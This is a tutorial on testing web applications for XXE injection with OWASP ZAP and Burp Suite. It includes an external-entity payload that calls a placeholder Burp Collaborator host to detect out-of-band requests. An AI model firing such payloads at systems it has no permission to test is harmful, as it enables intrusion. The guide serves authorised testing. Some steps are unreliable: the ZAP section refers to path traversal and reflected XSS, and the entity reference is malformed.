# XML external entity (XXE) injection

If an attacker attempts to insert an XML document into an application, this is known as XML Injection.
The programmer opens the door for attackers to provide unexpected, unreasonable, or malicious input by accepting an XML document without validating it against a DTD or XML schema.

## Owasp ZAP

OWASP ZAP (short for Zed Attack Proxy) is an open-source web application security scanner. ZAP can be defined as a “man-in-the-middle proxy.” It stands between the tester’s browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination. It can be used as a stand-alone application, and as a daemon process. This scanner claims to test against Path Transversal Vulnerability.

To install and run this scanner the user needs to go to https://www.zaproxy.org/download/ and select the system in which this tool will be installed. This scanner requires Java 8 +.

After installation the application will ask the user if the tester wants to persist the ZAP session. By default, ZAP sessions are always recorded to disk in a HSQLDB database with a default name and location. If you do not persist the session, those files are deleted when you exit ZAP.

To automatically test against Reflected XSS only needed to do the following:
* Click in the Quick Start Tab;
* Click on New Scan;
* In "Starting Point" click in the "Select" Button and choose a POST request to start on;
* Go to "Input Vectors" and check all boxes;
* Click on Start Scan;
* When the load bar is at 100% click on the "Alerts" tab.

If the system is vulnerable to XXE Injection it will appear in the Alerts tab after the scan.


## Burp Suite

Burp Suite is a software developed in Java by PortSwigger, to perform security tests on web applications. Burp Suite is divided into several components such has: Burp Proxy, Burp Spider, Burp Scanner, Burp Intruder, Burp Repeater. etc.
To download this tool the user needs to access https://portswigger.net/burp/communitydownload and download the program to their respective system.


To begin the testing with this tool the tester needs to config their browser's proxy configuration to "localhost" in port 8080.


To test the SUT the tester needs:

* Open the burp suite, go to the "Proxy" tab, click on "Intercept" and press the button "Intercept is off";
* Go to the browser and open the web page to be tested;

* Return to the "Proxy" tab, select intersect and then click on "Intercept is on";

* Access the URL with the parameter you wish to test;

* The request will be captured by the proxy "Intercept" tab;

* Right click anywhere on the request and select "Send to Repeater";

* Select the "Repeater" tab;

* Click the "Go" button;

* In the "Response" Panel you can observe the results of the request;

*  Imagining the XML in the response is something like this:

``` XML
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        381
    </productId>
</stockCheck> 
```

* The tester should insert the following XML line:

``` XML
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http:// your-sub-domain.burpcollaborator.act"> ]> 
```

* To get the Burp Collaborator URL the tester should click on the "Burp" tab and select "Burp Collaborator Client";

* A window will open and the tester will have the option to configure the collaborator. After the configuration click on the "Copy to clipboard" button;

* Paste the copied domain where it is written "your-sub-domain";

* Call the external entity (xxe) in the code, it should look something like this:

``` XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http:// your-sub-domain.burpcollaborator.act"> ]> 
<stockCheck>
    <productId>
        &xxe   
    </productId>
</stockCheck> 
```
* Click on the "Send" button;
* In the response tab it should show an error.
* Return to the collaborator client tab and if you can observe calls to the system the SUT is vulnerable against XXE Injection.